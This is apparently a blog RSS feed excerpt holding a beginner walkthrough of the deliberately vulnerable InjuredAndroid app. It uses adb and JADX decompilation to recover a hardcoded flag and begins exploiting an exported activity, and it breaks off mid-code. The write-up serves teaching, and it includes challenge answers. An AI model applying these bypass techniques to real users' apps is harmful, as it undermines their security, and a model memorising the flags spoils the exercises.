&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;[nine!_flag]&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Adding a .json extension in our url, we get a flag for our application.&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Android Application Security Series- Part 1</title>
        <link>https://thuri10.github.io/p/android-application-security-series-part-1/</link>
        <pubDate>Wed, 20 Oct 2021 20:19:29 +0300</pubDate>
        
        <guid>https://thuri10.github.io/p/android-application-security-series-part-1/</guid>
        <description>&lt;img src="https://thuri10.github.io/android.jpg" alt="Featured image of post Android Application Security Series- Part 1" /&gt;&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;This is a five part beginner series of Android application security with Vulnerable Android application examples. The application used in the first three part series is a vulnerable Android application developed by &lt;a class=&#34;link&#34; href=&#34;https://twitter.com/B3nac&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;@B3nac&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The application is &lt;em&gt;&lt;strong&gt;InjuredAndroid&lt;/strong&gt;&lt;/em&gt;,  it covers different security concepts such as hardcoded secrets, weak cryptographic algorithms, misconfiguration etc. The application can be downloaded from the following provided links  &lt;a class=&#34;link&#34; href=&#34;https://play.google.com/store/apps/details?id=b3nac.injuredandroid&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;playstore&lt;/a&gt; or from &lt;a class=&#34;link&#34; href=&#34;https://github.com/B3nac/InjuredAndroid&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;github&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Inorder to solve the challenges or follow through the guides is you need to have an android phone or an emulator. I will be using an android emulator throughout the series, my emulator of choice is android emulator which is part of android studio.&lt;/p&gt;
&lt;h3 id=&#34;enviroment-setup-and-decompilation&#34;&gt;Enviroment setup and decompilation&lt;/h3&gt;
&lt;p&gt;For installation of application to the emulator we will use Android debug bridge(adb). adb is a set of command line tools which are installed as part of android studio. adb enables communication between emulator/real android phone with connected computer.&lt;/p&gt;
&lt;p&gt;To install the application, use install command as shown in the Linux terminal below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;adb install InjuredAndroid-1.0.12-release.apk 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Launching the application in the emulator ,the interface will look like the image below.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://raw.githubusercontent.com/thuri10/images-blog/development/android/android_injured.png&#34; &gt;
		&lt;img src=&#34;https://raw.githubusercontent.com/thuri10/images-blog/development/android/android_injured.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			alt=&#34;InjuredAndroid&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;InjuredAndroid&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Tools used throughout the series are:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/skylot/jadx&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;JADX&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Text Editor (visual studio)&lt;/li&gt;
&lt;li&gt;Android Studio&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;JADX is a bundle of command line and GUI tools.jadx enables one to produce java source code from android Dex and APK files. This  will aid us to decompile the android application to java code which is human readable.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;For reverse engineering/ code auditing of every application, you need to have a clear set of goal or objective of what you want to achieve. This helps narrow down the analysis and avoid many rabbit holes.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;flag-one---login&#34;&gt;FLAG ONE - LOGIN&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Goal : Input the right flag.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;For the first challenge is to get the correct flag. flag is a piece of reward if you do correct task you are asked to do. Looking at the decompiled code in the editor as shown below, there is an interesting function called &lt;strong&gt;submitFlag&lt;/strong&gt;. submit flag function is responsible for validation of the user input.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;final&lt;/span&gt; &lt;span style=&#34;color:#8be9fd&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;submitFlag&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;View view&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
        EditText editText &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;EditText&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; findViewById&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;R&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;editText2&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
        C2724g&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m882d&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;editText&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;editText2&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;C2724g&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m885a&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;editText&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;getText&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;toString&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(),&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;F1ag_0n3&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
            Intent intent &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;new&lt;/span&gt; Intent&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; FlagOneSuccess&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color:#ff79c6&#34;&gt;new&lt;/span&gt; FlagsOverview&lt;span style=&#34;color:#ff79c6&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m4085J&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color:#ff79c6&#34;&gt;new&lt;/span&gt; ApplicationC1492j&lt;span style=&#34;color:#ff79c6&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m4065b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;flagOneButtonColor&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
            startActivity&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;intent&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;
    &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From the above code, the &lt;strong&gt;FlagoneActivity&lt;/strong&gt; class implements a functionality which the user input is compared with hardcoded flag in the application.&lt;/p&gt;
&lt;p&gt;The user entered flag string is compared with the hardcoded flag which is &amp;ldquo;&lt;strong&gt;F1ag_0n3&lt;/strong&gt;&amp;rdquo;. The class &lt;strong&gt;m10785a&lt;/strong&gt; compares the two objects ( user input flag and hardcoded flag) and return a boolean depending on the result of the comparison of two objects. A boolean result can be either true or false.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#8be9fd&#34;&gt;boolean&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;m10785a&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;Object obj&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; Object obj2&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; obj &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;null&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;?&lt;/span&gt; obj2 &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;null&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;:&lt;/span&gt; obj&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;equals&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;obj2&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If the condition is True, new Intent is started which is &lt;strong&gt;FlagOneSuccess&lt;/strong&gt;. Entering hardcoded flag as our input, we get a success message and color of &lt;strong&gt;Flag1&lt;/strong&gt; in flagsOverview Activity changes to green, meaning we have successfully solved the challenge1.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://raw.githubusercontent.com/thuri10/images-blog/development/android/solved.png&#34; &gt;
		&lt;img src=&#34;https://raw.githubusercontent.com/thuri10/images-blog/development/android/solved.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			alt=&#34;Flag one solved&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Flag one solved&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;The flag for level1 is &amp;ldquo;&lt;strong&gt;F1ag_0n3&lt;/strong&gt;&amp;rdquo;.&lt;br&gt;
For other levels if solved successfully, the color of the flag corresponding to that level will change to green.&lt;/p&gt;
&lt;h2 id=&#34;flag-two---exported-activity&#34;&gt;FLAG TWO - EXPORTED ACTIVITY&lt;/h2&gt;
&lt;p&gt;Goal : &lt;strong&gt;There is a way to  bypass the main activity and invoke other activities that are exported.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;what is an activity?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;An activity is a single, focused thing that the user can do. It is an application component that provide a user Interface for users to interact with.&lt;/p&gt;
&lt;p&gt;Looking at the &lt;strong&gt;flagtwoactivity&lt;/strong&gt;, the source code looks like the one shown below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;FlagTwoActivity&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;extends&lt;/span&gt; ActivityC0453c &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;

    &lt;span style=&#34;color:#6272a4&#34;&gt;/* renamed from: w */&lt;/span&gt;
    &lt;span style=&#34;color:#8be9fd&#34;&gt;int&lt;/span&gt; f4461w &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; 0&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;

    &lt;span style=&#34;color:#6272a4&#34;&gt;/* renamed from: F */&lt;/span&gt;
    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#6272a4&#34;&gt;/* synthetic */&lt;/span&gt; &lt;span style=&#34;color:#8be9fd&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;m4090F&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;View view&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#8be9fd&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;f4461w&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;i &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; 0&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
            Snackbar X &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; Snackbar&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m2647X&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;view&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;Key words Activity and exported.&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; 0&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
            X&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m2646Y&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;Action&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
            X&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;mo2650N&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;();&lt;/span&gt;
            &lt;span style=&#34;color:#ff79c6&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;f4461w&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++;&lt;/span&gt;
        &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;i &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; 1&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
            Snackbar X2 &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; Snackbar&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m2647X&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;view&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;Exported Activities can be accessed with adb or Drozer.&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; 0&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
            X2&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m2646Y&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;Action&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
            X2&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;mo2650N&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;();&lt;/span&gt;
            &lt;span style=&#34;color:#ff79c6&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;f4461w&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; 0&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;
    &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;

    &lt;span style=&#34;color:#6272a4&#34;&gt;/* access modifiers changed from: protected */&lt;/span&gt;
    @Override &lt;span style=&#34;color:#6272a4&#34;&gt;// androidx.appcompat.app.ActivityC0453c, androidx.fragment.app.ActivityC0797d, androidx.activity.ComponentActivity, androidx.core.app.ActivityC0714e, android.app.Activity
&lt;/span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8be9fd&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;onCreate&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;Bundle bundle&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;super&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;onCreate&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;bundle&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
        setContentView&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;R&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;layout&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;activity_flag_two&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
        m8078C&lt;span style=&#34;color:#ff79c6&#34;&gt;((&lt;/span&gt;Toolbar&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; findViewById&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;R&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;toolbar&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;));&lt;/span&gt;
        &lt;span style=&#34;color:#ff79c6&#34;&gt;((&lt;/span&gt;FloatingActionButton&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; findViewById&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;R&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;fab&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;)).&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;setOnClickListener&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;new&lt;/span&gt; View&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;OnClickListener&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt; &lt;span style=&#34;color:#6272a4&#34;&gt;// from class: b3nac.injuredandroid.d
&lt;/span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;            @Override &lt;span style=&#34;color:#6272a4&#34;&gt;// android.view.View.OnClickListener
&lt;/span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;final&lt;/span&gt; &lt;span style=&#34;color:#8be9fd&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;onClick&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;View view&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
                FlagTwoActivity&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m4090F&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;view&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;
        &lt;span style=&#34;color:#ff79c6&#34;&gt;});&lt;/span&gt;
    &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;strong&gt;oncreate&lt;/strong&gt; method is used for initializing our activity. The goal of the challenge is to invoke the flagtwoactivity from an external application. This activity is called &lt;em&gt;&lt;strong&gt;exported activity&lt;/strong&gt;&lt;/em&gt;, meaning it can be started outside the context of the application.&lt;/p&gt;
&lt;p&gt;Activities in android are defined in a file called &lt;em&gt;AndroidManifest.xml&lt;/em&gt; .&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;activity&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;android:name=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;b3nac.injuredandroid.b25lActivity&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;android:exported=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As you see above, the activity &lt;em&gt;b3nac.injuredandroid.b25lActivity&lt;/em&gt; can be invoked by external application because &lt;em&gt;android:exported&lt;/em&gt;  attribute is set to true.&lt;/p&gt;
&lt;p&gt;For exploitation of the above issue we will use adb. First we use adb to list the installed packages in the device and grep the application of our interest using Linux grep utility.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;vx@archie:~$ adb shell pm list packages | grep injuredandroid
package:b3nac.injuredandroid
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;what happens when invoke b25lActivity class activity?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;When b25lActivity activity is invoked by an external program, it sets the flag2 color to green in the FlagsOverview activity.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;/* loaded from: classes.dex */&lt;/span&gt;
&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;final&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;b25lActivity&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;extends&lt;/span&gt; ActivityC0453c &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color:#6272a4&#34;&gt;/* access modifiers changed from: protected */&lt;/span&gt;
